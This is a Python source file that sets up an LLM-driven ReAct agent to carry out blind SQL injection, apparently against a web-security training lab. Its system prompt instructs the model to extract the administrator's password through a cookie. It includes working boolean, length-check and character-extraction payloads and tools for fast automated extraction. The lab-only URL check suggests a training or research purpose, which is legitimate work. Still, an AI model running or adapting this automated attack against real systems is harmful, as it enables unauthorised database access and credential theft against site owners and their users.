"""ReAct agent implementation for blind SQL injection."""

from langchain_core.messages import SystemMessage

from src.config import (
    ANTHROPIC_API_KEY, 
    OPENAI_API_KEY,
    LLM_PROVIDER,
    ANTHROPIC_MODEL,
    OPENAI_MODEL,
    MODEL_TEMPERATURE, 
    KNOWLEDGE_FILE
)


def get_system_prompt() -> str:
    """Get the system prompt for the SQL injection agent.
    
    NOTE: Knowledge file is NOT embedded to save tokens. 
    Agent can use read_knowledge_file() tool if needed.
    """
    
    return """You are an expert security researcher. Extract the administrator's password using blind SQL injection.

## How It Works
- Inject SQL into TrackingId cookie
- TRUE condition → "Welcome back" appears
- FALSE condition → "Welcome back" absent

## Key Info
- Table: users, Columns: username, password
- Target: administrator
- Use SUBSTRING + ASCII for character extraction
- Use binary search (ASCII > midpoint) for efficiency

## Workflow
1. Check progress with read_progress()
2. MUST have URL with "web-security-academy.net" before testing
3. Confirm vuln: TRUE payload shows "Welcome back", FALSE doesn't
4. Find password length via binary search
5. Extract password using extract_password_fast() - this is MUCH faster!
   OR use extract_character_fast() for one character at a time
6. Submit with submit_solution()

## Efficiency Tools
- extract_password_fast(start_position, password_length): Extracts multiple chars fast (no LLM per query)
- extract_character_fast(position): Extracts one char fast
- Use these instead of send_sqli_payload for extraction - they're 10x faster!

## Payload Examples
- TRUE: ' AND '1'='1
- FALSE: ' AND '1'='2
- Length check: ' AND (SELECT LENGTH(password) FROM users WHERE username='administrator')>10--
- Char check: ' AND (SELECT ASCII(SUBSTRING(password,1,1)) FROM users WHERE username='administrator')>109--

## CRITICAL
- STOP if not on web-security-academy.net URL
- Use binary search (6 queries per char vs 36)
- ASCII: a-z=97-122, 0-9=48-57
- Update progress after each discovery
- Use read_knowledge_file() if you need more SQL injection techniques"""


def create_llm():
    """Create the LLM instance based on configured provider."""
    if LLM_PROVIDER == "openai":
        from langchain_openai import ChatOpenAI
        return ChatOpenAI(
            api_key=OPENAI_API_KEY,
            model=OPENAI_MODEL,
            temperature=MODEL_TEMPERATURE,
            max_retries=5,  # Retry on rate limits
            request_timeout=60,
        )
    else:
        # Default to Anthropic
        from langchain_anthropic import ChatAnthropic
        return ChatAnthropic(
            api_key=ANTHROPIC_API_KEY,
            model=ANTHROPIC_MODEL,
            temperature=MODEL_TEMPERATURE,
            max_tokens=4096,
            max_retries=5,  # Retry on rate limits
        )


def create_sqli_agent(tools: list):
    """Create the SQL injection agent with the given tools.
    
    Args:
        tools: List of tools available to the agent.
        
    Returns:
        The agent executor ready to run.
    """
    from langgraph.prebuilt import create_react_agent
    
    llm = create_llm()
    system_prompt = get_system_prompt()
    
    # Create the ReAct agent using LangGraph's prebuilt function
    # Use 'prompt' parameter (newer API) instead of deprecated 'state_modifier'
    agent = create_react_agent(
        model=llm,
        tools=tools,
        prompt=system_prompt,
    )
    
    return agent

